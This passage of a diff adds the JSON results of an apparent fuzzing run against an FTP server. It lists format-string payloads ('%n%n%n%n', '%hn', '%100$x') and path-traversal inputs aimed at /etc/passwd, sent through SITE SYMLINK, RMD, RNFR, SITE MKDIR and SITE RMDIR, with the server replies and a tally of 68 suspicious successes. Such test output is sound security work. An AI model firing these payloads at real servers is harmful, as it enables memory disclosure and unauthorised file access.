+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 367,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %2$x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 368,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %3$x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 369,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %10$x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 370,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %100$x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 371,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %1$s",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 372,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %2$s",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 373,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %3$s",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 374,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %1$n",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 375,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %2$n",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 376,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK AAAA%x%x%x%x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 377,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 378,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 379,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 380,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK ../%x%x%x%x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 381,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %x/../../../etc/passwd",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    }
+  ],
+  "crashes": [],
+  "anomalies": [
+    {
+      "id": 141,
+      "category": "format_string_RMD",
+      "command": "RMD %x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 142,
+      "category": "format_string_RMD",
+      "command": "RMD %s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 143,
+      "category": "format_string_RMD",
+      "command": "RMD %n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 144,
+      "category": "format_string_RMD",
+      "command": "RMD %d",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 145,
+      "category": "format_string_RMD",
+      "command": "RMD %p",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 146,
+      "category": "format_string_RMD",
+      "command": "RMD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 147,
+      "category": "format_string_RMD",
+      "command": "RMD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 148,
+      "category": "format_string_RMD",
+      "command": "RMD %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 149,
+      "category": "format_string_RMD",
+      "command": "RMD %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 150,
+      "category": "format_string_RMD",
+      "command": "RMD %n%n%n%n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 151,
+      "category": "format_string_RMD",
+      "command": "RMD %hn%hn%hn%hn",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 152,
+      "category": "format_string_RMD",
+      "command": "RMD %hhn%hhn%hhn%hhn",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 153,
+      "category": "format_string_RMD",
+      "command": "RMD %1$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 154,
+      "category": "format_string_RMD",
+      "command": "RMD %2$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 155,
+      "category": "format_string_RMD",
+      "command": "RMD %3$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 156,
+      "category": "format_string_RMD",
+      "command": "RMD %10$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 157,
+      "category": "format_string_RMD",
+      "command": "RMD %100$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 158,
+      "category": "format_string_RMD",
+      "command": "RMD %1$s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 159,
+      "category": "format_string_RMD",
+      "command": "RMD %2$s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 160,
+      "category": "format_string_RMD",
+      "command": "RMD %3$s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 161,
+      "category": "format_string_RMD",
+      "command": "RMD %1$n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 162,
+      "category": "format_string_RMD",
+      "command": "RMD %2$n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 163,
+      "category": "format_string_RMD",
+      "command": "RMD AAAA%x%x%x%x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 164,
+      "category": "format_string_RMD",
+      "command": "RMD AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 166,
+      "category": "format_string_RMD",
+      "command": "RMD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 196,
+      "category": "format_string_RNFR",
+      "command": "RNFR %x/../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 307,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 308,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 309,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 310,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %d",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 311,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %p",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 312,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 313,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 314,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 315,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 316,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %n%n%n%n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 317,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %hn%hn%hn%hn",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 318,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %hhn%hhn%hhn%hhn",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 319,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %1$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 320,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %2$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 321,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %3$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 322,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %10$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 323,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %100$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 324,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %1$s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 325,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %2$s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 326,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %3$s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 327,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %1$n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 328,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %2$n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 329,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR AAAA%x%x%x%x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 330,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 332,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 334,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x/../../../etc/passwd",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 335,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 336,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %p",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 337,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 338,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 339,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %n%n%n%n",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 340,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %hhn%hhn%hhn%hhn",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 341,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %1$x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 342,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %2$x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 343,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %1$s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 344,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %2$s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 345,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %3$s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 346,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %1$n",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 347,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %2$n",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 348,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR AAAA%x%x%x%x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 349,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 351,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    }
+  ],
+  "total_tests": 381,
+  "total_crashes": 0,
+  "total_anomalies": 68,
+  "end_time": "2026-02-14T08:54:25.031059"
+}
